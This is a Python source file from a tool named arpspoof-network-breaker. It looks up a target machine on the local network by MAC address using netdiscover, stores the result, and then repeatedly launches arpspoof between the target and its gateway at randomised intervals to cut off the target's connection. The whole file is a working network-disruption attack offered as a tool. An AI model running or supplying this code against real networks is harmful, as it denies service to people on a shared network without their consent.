# -*- coding: utf-8 -*-
# main.py
# Copyright (C) 2018-2019 KunoiSayami
#
# This module is part of arpspoof-network-breaker and is released under
# the AGPL v3 License: https://www.gnu.org/licenses/agpl-3.0.txt
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
import ctrlsub
from configparser import ConfigParser
import socket
import time
import re
import netifaces
import subprocess
import sys
import operator
import random

mac_match = re.compile(r'^(([0-9a-f]){2}[:-]){5}([0-9a-f]{2})$')
ip_match = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')

def printl(string: str):
	print('{}: {}'.format(time.strftime('%Y-%m-%d %H:%M:%S'), string))

def vaildate_ip(ip_addr: str):
	try:
		socket.inet_aton(ip_addr)
	except socket.error:
		return False
	return True

mcb = False

if len(sys.argv) == 1:
	config = ConfigParser()
	if len(config.read('config.ini')) == 0 or not config.has_section('arpspoof') or not (config.has_option('arpspoof', 'mac') or config.has_option('arpsoof', 'ip')):
		raise FileNotFoundError('Cannot find configure file')
else:
	mcb = True

class interface(object):
	def __init__(self, interface: str):
		self.interface = interface
		self.gateway = ''
		n = netifaces.gateways()
		for m in n[netifaces.AF_INET]:
			if m[1] == interface:
				self.gateway = m[0]
				break
		if self.gateway == '':
			print(interface)
			print(n)
			print('Fail to get gateway ip in {}, ignored.'.format(interface))
			return
		n = netifaces.ifaddresses(interface)
		self.ip = n[netifaces.AF_INET][0]['addr']
		self.netmask = n[netifaces.AF_INET][0]['netmask']
		self.base = self._get_base(self.netmask)
		self.search_ip = self._get_search_ip()
	@staticmethod
	def _get_base(netmask: str):
		return len(''.join([bin(int(x))[2:] for x in netmask.split('.')]).replace('0', ''))
	def _get_search_ip(self):
		tmp = '{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in self.ip.split('.'))[:self.base])
		return '.'.join([str(int(tmp[x * 8 : (x + 1) * 8], 2)) for x in range(0, 4)])
	def __str__(self):
		return '{}: {}, {}, {}, {}, {}'.format(self.interface, self.ip, self.netmask, self.gateway, self.search_ip, self.base)
	def check_sub(self, ip: str):
		tmp = '{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in ip.split('.'))[:self.base])
		ip_tmp = ''.join(list(reversed(str(int(''.join(list(reversed('{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in self.search_ip.split('.'))[:self.base])))))))))
		return tmp.startswith(ip_tmp)
		
class arpcfg(object):
	def __init__(self, cfgstr: str):
		self.ip, self.mac, self.interface, self.gateway = cfgstr.split('\\n')

class arp_class(object):
	def __init__(self, mac_addr: str = '', ip: str = '', cli: bool = False):
		''' Define interface process sproof '''
		self.target_interface = None
		if cli == True:
			pass
		self.mac = mac_addr
		self.ip = ip
		self.interval = int(config['arpspoof']['interval'])
		self.blocktime = int(config['arpspoof']['blocktime'])
		self.randomtime = int(config['arpspoof']['random_time'])
		self.vaildate()
		# TODO: TBD thread search
		self.interfaces = {name: interface(name) for name in netifaces.interfaces() if not any(name.startswith(x) for x in ('lo', 'docker'))}
		self.load()
	def call(self):
		if self.mac != '' and self.ip == '':
			self.search_mac()
			self.main_activity()
		else:
			self.main_activity()
	def search_child(self, l: interface):
		netdiscover_proc = subprocess.Popen(['netdiscover', '-i', l.interface, '-r', '{}/{}'.format(l.search_ip, l.base), '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
		for x in netdiscover_proc.communicate()[0].decode().splitlines():
			if len(x.split()) > 3 and self.mac in x.split()[1]:
				self.ip = x.split()[0]
				self.target_interface = l
				break
	def search_mac(self):
		l = [item for _, item in self.interfaces.items() if hasattr(item, 'base')]
		l.sort(key = operator.attrgetter('base'), reverse = True)
		for x in l:
			self.search_child(x)
			if self.ip != '': break
		if self.ip == '': raise RuntimeError('Cannot found IP by MAC address')
		self.save()
	def search_ip(self):
		for _, n in self.interfaces.items():
			if n.check_sub(self.ip):
				self.target_interface = n
				break
		if self.target_interface is None:
			self.target_interface = self.interfaces[input('Cannot find interface to process, please specify interface [{}]: '.format(','.join(n for n, _ in self.interfaces.items())))]
	def vaildate(self):
		if len(self.mac):
			self.mac = self.mac.lower().replace('-', ':')
			if mac_match.match(self.mac) is None:
				raise ValueError('MAC address is invaild')
		if len(self.ip):
			if not vaildate_ip(self.ip):
				raise ValueError('IP address is invaild')
		if not len(self.mac) and not len(self.ip):
			raise ValueError('Both value is None')
	def load(self, file_name: str = '.arpcfg'):
		try:
			with open(file_name) as fin:
				r = fin.readlines()
			l = map(arpcfg, (x if '\n' not in x else x[:-1] for x in r))
			for x in l:
				if self.check(x.ip, x.mac, x.interface):
					self.target_interface = self.interfaces(x.interface)
					del l, r
					return True
			return False
		except FileNotFoundError: pass
	def save(self, file_name: str = '.arpcfg'):
		with open(file_name, 'a') as fout:
			print('\\n'.join((self.ip, self.mac, self.target_interface.interface, self.target_interface.gateway)), file = fout)
	@staticmethod
	def check(ip_addr: str, mac: str, interface_name: str):
		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', '{}/32'.format(ip_addr), '-i', interface_name, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
		return mac in netdiscover_proc.communicate()[0].decode()
	def main_activity(self):
		while True:
			try:
				ctrlsub.runable(
					['arpspoof', '-i', self.target_interface.interface, '-t', self.target_interface.gateway, '-r', self.ip],
					self.get_rand_sleep(),
					start_msg = 'Start spoof',
					exit_msg = 'Wait arpspoof to exit (fix connection)',
					after_wait_msg = 'Stopped'
				)
				time.sleep(self.get_rand_interval())
			except KeyboardInterrupt:
				while True:
					try:
						input('Paused, press Enter to continue')
						break
					except (EOFError, KeyboardInterrupt):
						return
			except SystemExit as e:
				raise e
			except:
				import traceback
				print(self.ip, self.mac, self.interfaces)
				traceback.print_exc()
	def get_rand_sleep(self):
		return self.blocktime if self.randomtime == 0 else self.blocktime + random.randint( -self.blocktime + 2 , self.blocktime)
	def get_rand_interval(self):
		return self.interval if self.randomtime == 0 else self.interval + random.randint(-self.randomtime, self.randomtime)

def main():
	mac = config['arpspoof']['mac'] if config.has_option('arpspoof', 'mac') and config['arpspoof']['mac'] != '' else ''
	ip = config['arpspoof']['ip'] if config.has_option('arpspoof', 'ip') and config['arpspoof']['ip'] != '' else ''
	arp_class(mac, ip, mcb).call()

if __name__ == "__main__":
	main()